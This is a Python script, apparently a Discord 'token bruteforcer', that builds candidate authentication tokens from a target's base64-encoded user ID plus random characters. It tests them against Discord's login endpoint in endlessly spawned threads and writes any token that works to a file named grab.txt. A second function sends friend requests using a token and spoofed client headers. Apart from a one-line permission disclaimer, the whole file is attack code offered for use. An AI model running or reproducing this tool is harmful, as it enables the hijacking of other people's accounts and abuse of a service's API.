import threading
from discord.ext import commands
import discord
import pyautogui
import time
from requests import post
from random import randint
import re
import http.client
import random
import json
import requests
from threading import Thread
from requests import Session
import base64
import string
import sys


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text




def friender(token, user):
    try:
        user = user.split("#")
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB",
            "authorization": token,
            "content-length": "90",
            "content-type": "application/json",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        payload = {"username": user[0], "discriminator": user[1]}
        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,
                            json=payload)
        if src.status_code == 204:
            print(f"[+] Friend request sent to {user[0]}#{user[1]}! [{token}]")
    except Exception as e:
        print(e)



def spammer():
    print("██████╗░███████╗██╗░░██╗██╗░░░██╗  ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗███████╗██████╗░")
    print("██╔══██╗██╔════╝╚██╗██╔╝██║░░░██║  ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║██╔════╝██╔══██╗")
    print("██║░░██║█████╗░░░╚███╔╝░╚██╗░██╔╝  ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║█████╗░░██████╔╝")
    print("██║░░██║██╔══╝░░░██╔██╗░░╚████╔╝░  ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║██╔══╝░░██╔══██╗")
    print("██████╔╝███████╗██╔╝╚██╗░░╚██╔╝░░  ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║███████╗██║░░██║")
    print("╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝")

    print("                                                                        Made by DEXV#6969")

    print('Press 1 to start')

    choice = int(input('[?]> '))
    
    
    if choice == 1:
        print('''
╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╭╮╱╱╱╭╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╭╮╱╱╱╱╭━╮
╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭╯╰╮╱╱┃┃╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭╯╰╮╱╱╱┃╭╯
╭━╯┣━━┳╮╭┳╮╭╮╭━┳━━┳┳━╯┣━━┳━╮╰╮╭╋━━┫┃╭┳━━┳━╮╱┃╰━┳━┳╮┣╮╭╋━━┳╯╰┳━━┳━┳━━┳━━╮
┃╭╮┃┃━╋╋╋┫╰╯┃┃╭┫╭╮┣┫╭╮┃┃━┫╭╯╱┃┃┃╭╮┃╰╯┫┃━┫╭╮╮┃╭╮┃╭┫┃┃┃┃┃┃━╋╮╭┫╭╮┃╭┫╭━┫┃━┫
┃╰╯┃┃━╋╋╋╋╮╭╯┃┃┃╭╮┃┃╰╯┃┃━┫┃╱╱┃╰┫╰╯┃╭╮┫┃━┫┃┃┃┃╰╯┃┃┃╰╯┃╰┫┃━┫┃┃┃╰╯┃┃┃╰━┫┃━┫
╰━━┻━━┻╯╰╯╰╯╱╰╯╰╯╰┻┻━━┻━━┻╯╱╱╰━┻━━┻╯╰┻━━┻╯╰╯╰━━┻╯╰━━┻━┻━━╯╰╯╰━━┻╯╰━━┻━━╯
Do not do this without the permission of the person to whom the bruteforce attack is conducted.''')


        id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]

        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))

                headers = {'Authorization': token}

                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print('[+] VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print('[-] INVALID' + ' ' + token)
                finally:
                    print('')

        def thread():
            while True:
                threading.Thread(target=bruteforece).start()

        thread()

        exit = input('press any key: ')
        exit = spammer()

spammer()

     